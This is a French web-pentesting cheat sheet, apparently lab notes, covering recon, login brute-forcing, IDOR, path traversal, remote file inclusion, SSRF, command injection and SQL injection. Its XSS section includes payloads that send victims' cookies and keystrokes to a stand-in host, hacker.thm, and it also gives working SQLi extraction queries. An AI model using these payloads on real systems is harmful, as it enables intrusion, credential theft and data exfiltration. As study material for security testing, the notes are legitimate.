```toc

```

# Outils
## Wapalizer
Extension Firefox qui permet d'identifier les technologies et framework utilisés (wordpress, react, ...) par un site internet.

## Nikto
Scanneur de vulnérabilités web.

## WPscan
Si le site est en WordPress (un bon indicateur est la présence de dossier en "wp-..." dans les sources, cf inspecteur > sources), utiliser *wpscan* permet d'identifier les vulnérabilité classique.
https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation

*Note* : wpscan nécessite une clé API pour faire les scans de vuln, etc (un compte gratuit suffit).

## Brute force path, users, pwd, ...
dirb, ffuf


# 1. Content discovery

## Manuellement
Déjà, se promener sur le site et identifier toutes les pages accessibles et celles avec une entrée utilisateur possible.

Checklist :
- Chercher ``robots.txt`
- Chercher `sitemap.xml`
- Identifier les technologies utilisées :
	- Regarder si le favicon a été changé
	- Utiliser Wapalizer
	- Regarder le code source (wp-content, wp-... => Wordpress)
	- Faire une requête `curl` et regarder les headers
- Faire de l'OSINT :
	- Google dorking (`site:sitetohack`, `inurl:admin`, `filetype:pdf`, `intitle:admin`)
	- Chercher une veille version du site : [https://archive.org/web/](https://archive.org/web/)
	- Chercher un répertoire Github
	- Chercher un bucket S3 : https://{name}.s3.amazonaws.com en essayer avec name étant : nomentreprise-assets, nomentreprise-public, nomentreprise-www, ...

## Automatiquement
Prendre une wordlist efficace, par exemple : [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) 

Puis utiliser dirb ou gobuster par exemple (dirb est recursif par défaut mais pas gobuster).
```bash
dirb <target_url> /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

gobuster dir --url <target_url> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```



## Sous domaine
Objectif : trouver des sous-domaines pour élargir le périmètre.
### OSINT
Utiliser http://crt.sh/ pour chercher le domaine à attaquer et voir si des certificats SSL ont été enregistrés pour d'autres sous domaines.

Faire du google dorking : `-site:www.domain.com site:*.domain.com`

### Brute force
Brute force les sous-domaines possibles : 
```bash
dnsrecon -t brt -d <domain>

./sublist3r.py -d acmeitsupport.thm
```

### Virtual host
Des sous-domaines peuvent ne pas être exposé publiquement (version de dev, sous-domaine du backend, ...). Ces sous-domaines peuvent être définis dans /etc/hosts par exemple.
Si on envoie une requête au serveur avec un header Host étant un sous domaine valide (backend.domain.com en supposant qu'il existe), le serveur répondra une réponse différente d'un sous domaine invalide.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u <url>

# Then filter all failed attempts (responses with the same length which represent the majority)
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u <url> -fs <resp_size_to_filter>
```

"FUZZ" indique quel partie `ffuf` changera.


# 2. Contourner l'authentification
Objectifs :
1. Lister les utilisateurs existants
2. Trouver leur mot de passe

## Lister des utilisateurs existants
Si une page renvoie une erreur différente lorsqu'un utilisateur existe, il faut l'exploiter !
Regarder en particulier la page pour créer un compte et celle pour reset le mot de passe.
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u <signup_url> -mr "username already exists"
```
Le tag `mr` est le texte qui sera cherché dans la réponse pour valider qu'un utilisateur a été trouvé.

## Trouver leur mot de passe
L'idée est simple : brute force le mot de passe.
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <login_url> -fc 200
```
Le tag `fc` filtre les code de retour 200 pour n'afficher que les lignes avec des codes de retour différent de 200 (302 car il y a une redirection par exemple).

## Bonus
- Trouver une faille dans la logique d'authentification ou de reset du mot de passe (voir la requête exacte qui est effectué et si on peut jouer avec).
- Jouer avec le cookie pour gagner des droits (ex : changer admin=false en admin=true).


# IDOR
Insecure Direct Object Reference : quand l'utilisateur peut faire référence à un objet et que le serveur le lui renvoie alors qu'il ne devrait pas (changer l'id dans l'url, ...).

Pour en trouver :
- Bien regarder les requêtes faîtes au back : l'id est-il dans l'url, dans le corps du post, le front fait-il un appel à une API back pour afficher des info (cf réseau dans les outils développeur), ...
- Trouver comment prédire l'ID :
	- ID prédictible directement (1234, 1235, ...)
	- ID encodé en base64
	- ID hashé en md5
- Si l'ID n'est pas prédictible : créer 2 comptes et essayer d'accéder au contenu du compte 1 depuis le compte 2. Si ça fonctionne, on a trouvé une vulnérabilité IDOR.

# File inclusion
Un site web peut avoir besoin d'afficher un fichier (pdf, text, photo, ...) qui est requêté par le front. En l'absence de validation de l'input du front, il est possible de demandé un autre fichier et de faire fuiter de l'information, accéder au mot de passe des comptes sur la machines (`/etc/shadow`), ...
## Path traversal
On remonte dans l'arborescence des fichiers avec autant de "`../`" que nécessaire pour accéder au dossier racine puis on essaie d'accéder à des fichiers tel que `/etc/passwd` ou `/etc/shadow` sur Linux et `c:\boot.ini` sur Windows.

Exemples :
```
GET http://webapp.thm/get.php?file=../../../../etc/passwd
GET http://webapp.thm/get.php?file=../../../../boot.ini
```


En PHP, en l'absence de validation de l'input, les fonctions suivantes sont vulnérables :
- get_file_contents
- include
- require

Petit tricks en cas de filtrage :
- Ajouter un octet nul à la fin : `%00`
- Ecrire le path différemment :
	- Ajouter `/.` à la fin
	- Remplacer `../` par `....//` (cela fonctionne si les `../` sont filtrés une seule fois)
	- Commencer par `foldername_to_include_from/../` si fichiers doivent être importés depuis un dossier en particulier

## Remote File Inclusion
Si la configuration du serveur le permet, il peut être possible d'inclure un fichier présent sur un autre serveur contrôlé par l'attaquant.
En PHP, il faut que l'option `allow_url_fopen` valent `on`.

Ex : `http://webapp.thm/index.php?file=http://attacker.thm/cmd.txt`

Le serveur va récupérer le fichier `cmd.txt` hébergé chez l'attaquant, il va l'exécuter et renvoyer le résultat dans sa page `index.php`.

On peut tester cette vulnérabilité avec le fichier `cmd.txt` suivant : 
```php
<?PHP echo "YEEEAAH !!!"; ?>
```
Cela peut permettre de l'exécution de code à distance (RCE) !!!
Par exemple :
```php
<?PHP
echo exec('hostname');
?>
```


# SSRF
Server Side Request Forgery : manipuler le serveur du front pour qu'il exécute la requête que l'on a envie.
Exemples :
```
Utilisateur : GET https://website.fr?url=/user
Serveur front : GET https://website.fr/api/user?param=true (et renvoie la réponse à l'utilisateur)
```
Un attaquant peut manipuler le paramètre `url`.

Astuces :
- `../` permet de remonter d'un niveau dans l'url, donc si on met `url=../admin`, le serveur fera une requête à `/api/../admin` qui est équivalent à `/admin`.
- `?x=` ou `&x=` permet d'ignorer ce qui suit, donc si on met `url=../admin?param=false&x=`, le serveur fera une requête équivalente à `/admin?param=false`.
- Parfois l'entrée utilisateur est utilisé comme sous domaine, ce qui permet de controller tout l'url avec l'astuce précédente. Ex normal : `?server=api` mènera à la requête à `https://api.website.fr`. Ex malicieux : `?server=secret.website.fr?x=`.
- Quand on a le contrôle total sur l'URL on peut en particulier demander à requêter un serveur que l'on contrôle.
- On peut accéder au page qui ont une restriction sur l'origine de la requête ! (Ex : page admin accessible que depuis le localhost).
- Il peut être intéressant d'accéder au serveur directement via `127.0.0.1` ou aux metadonnées de l'instance dans le cas du cloud via `169.254.169.254`.

Entrées principales pour une SSRF :
- Url entière en paramètre : `?server=http.server.website.fr/store`
- Url partielle : `?server=api`
- Path dans l'url : `/forms/contact`
- Champ caché dans un formulaire : 
```html
<input type=hidden name=server value="https://server.website.fr/store"
```



# XSS
Cross Site Scripting : exécuter du code javascript dans le navigateur de la victime

Exemple :
- *Stored XSS* : mettre un commentaire sur un forum `<scrip>alert('pawned')</script>`, si l'input est stocké tel quel dans la bdd et qu'il est inséré sans traitement (encodage) dans la page envoyé à l'utilisateur visitant le forum, le code sera exécuté. Un autre exemple est de faire la même chose dans les champs de son profil utilisateur.
- *Reflected XSS* : faire du phishing en envoyant le lien `https://website.com/name=<scrip>alert('pawned')</script>`, si la page affiche la valeur de `name` sans traitement, le script sera exécuté.

Exemple de payload :
- `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>` : permet de récupérer le cookie de la victime (l'encode en basse64 pour être sur de la bonne transmission)
- `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>` : key logger
- `<script>user.changeEmail('attacker@hacker.thm');</script>` : si une fonction spécifique au site vulnérable est `user.changeEmail`, on peut l'exécuter aussi.

Il peut-être utile de modifier la payload pour échapper la balise dans laquelle elle apparaît, par exemple `<\textarea><script>...<\script>`.
Il existe des alternatives à la balise script lorsque celle ci est filtré. Par exemple :
- `<sscriptcript>alert('THM');</sscriptcript>`
- `<img src="fake" onerror="alert('THM');" />`

Un outil pour aider la recherche de XSS est : https://github.com/mandatoryprogrammer/xsshunter-express

Pour faire des tests, il est possible d'utilise https://beeceptor.com pour recevoir les requêtes faite par la payload et les cookies de session par exemple.


# Command injection / RCE
L'injection de commande ou Remote Command Execution consiste à faire exécuter une entrée utilisateur par l'OS sur lequel tourne le serveur.
Ex : le serveur, codé en PHP ou Python par exemple, fait un appel système pour exécuter la commande `grep $user_input file` pour faire une recherche sur un fichier présent sur le serveur. Si cette entrée n'est pas filtré, l'utilisateur pourra la modifier pour exécuter une autre commande.

On peut distinguer 2 cas :
- Le serveur renvoie directement le résultat de la commande : c'est le cas le plus simple.
- Le serveur ne renvoie pas le résultat de la commande : pour identifier la faille, on peut utiliser les commandes `ping` ou `sleep` pour créer un délai dans la réponse, ou rediriger le résultat de la commande dans un fichier (`> file.txt`) puis afficher le contenu du fichier (accès direct au fichier, utilisation de `cat`, ...). 

Les opérateur `&`, `&&` et `;` sont particulièrement utiles pour les injections de commandes.

Commandes utiles :
- Linux :
	- `whoami`
	- `ls`
	- `ping`
	- `sleep`
	- `nc`
- Windows :
	- `whoami`
	- `dir`
	- `ping`
	- `timeout`

Note : `ping` n'est pas installé par défaut mais `sleep` ou  `timeout` le sont.

Command injection cheat-sheet : https://github.com/payloadbox/command-injection-payload-list


# SQL injection
Lorsqu'une entrée utilisateur est incluse dans une requête SQL sans précaution, il est possible de détourner la requête SQL.

Requête normale et requête SQL associée : 
```sql
-- GET https://website/login?username=paul&password=123
SELECT user WHERE username='paul' AND password='123'
```
Requête malveillante (le mdp n'est pas vérifié) et requêtes SQL associées :
```sql
-- GET https://website/login?username=paul';--&password=osef
SELECT user WHERE username='paul';--'' AND password='osef'

-- GET https://website/login?username=paul&password=osef OR 1=1
SELECT user WHERE username='paul' AND password='osef' OR 1=1
```

On commence par trouver un input vulnérable (en regardant les erreurs ou directement le résultat du serveur).
Tips : `;` termine une commande SQL, `--` met en commentaire la suite.

## UNION based SQLi
Pour que l'UNION fonctionne il faut que les 2 côté de l'union ait le même nombre de colonnes, sinon on aura une erreur.
Pour le déterminer, on procède itérativement :
```sql
... UNION SELECT 1
... UNION SELECT 1, 2
... UNION SELECT 1, 2, 3
... UNION SELECT 1, 2, 3, 4
```
Ensuite, on s'assure que la première partie de la requête ne renvoie pas de résultat, comme ça, le résultat renvoyé sera celui de la deuxième partie de la requête (après le UNION donc).

Supposons que 3 colones soit renvoyé.
Maintenant, on veut récupérer des informations sur la db, le nom des tables, etc. Voici un exemple pour **mysql**.
```sql
-- Donne le nom de la db actuelle
'' UNION SELECT 1, 2, database()

-- Liste les tables de la bd <db_name>
'' UNION SELECT 1, 2, group_concat(table_name) FROM information_schema.tables WHERE table_schema='<db_name>'

-- Liste les colonnes de la table <table_name>
'' UNION SELECT 1, 2, group_concat(column_name) FROM information_schema.columns WHERE table_name='<table_name>'
```

A partir de là, on a toutes les informations nécessaires sur la structure des tables et on peut exfiltrer les données souhaitées.
```sql
-- Récupération d'une ligne
'' UNION SELECT 1 ,2 , password FROM staff_users WHERE username='martin' 

-- Récupération de toutes les lignes
'' UNION SELECT 1, 2, group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users
```

## Boolean blind SQLi
Dans ce cas, la seule information que renvoie le serveur sur l'entrée vulnérable est un booléen.
Par exemple, l'API `https://website.thm/checkuser?username=admin` renvoie vrai si le nom admin est déjà pris et faux sinon. Si cet API est vulnérable, alors elle renverra vrai si la requête SQL sous-jacente est vraie.

On peut alors reprendre la méthode précédente basée sur les UNION, mais avec plus de patience.
```sql
-- On identifie qu'il y a 3 colonnes renvoyées (la requête suivante renvoie True)
UNION SELECT 1, 2, 3;-- 

-- On identifie le nom de la db en utilisant 'like'
UNION SELECT 1, 2, 3 WHERE database() like 'a%';--       Renvoie True si le nom commence par 'a'
UNION SELECT 1, 2, 3 WHERE database() like 'at%';--       Renvoie True si le nom commence par 'at'
...

-- Idem avec le nom des tables
UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = '<db_name>' and table_name like 'a%';--

-- Idem pour le nom des colonnes
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--

-- Finalement, on extrait ce que l'on souhaite de la même façon
UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--
```
Note : il faut ajouter un apostrophe au début de chacune des requêtes SQL précédente (je l'ai pas mise car ça casse les couleurs du texte...).

## Time based blind SQLi
Ici, aucune information n'est renvoyé à l'utilisateur. La seule façon de confirmer qu'une injection SQL est possible est en ajoutant `sleep(5)` dans la requête, et si l'injection se passe correctement, la réponse aura 5s de délai.
On se retrouve alors dans le même que avec un booléen et la démarche est la même.
```sql
-- La première requête devient
UNION SELECT SLEEP(5), 2, 3;--
```
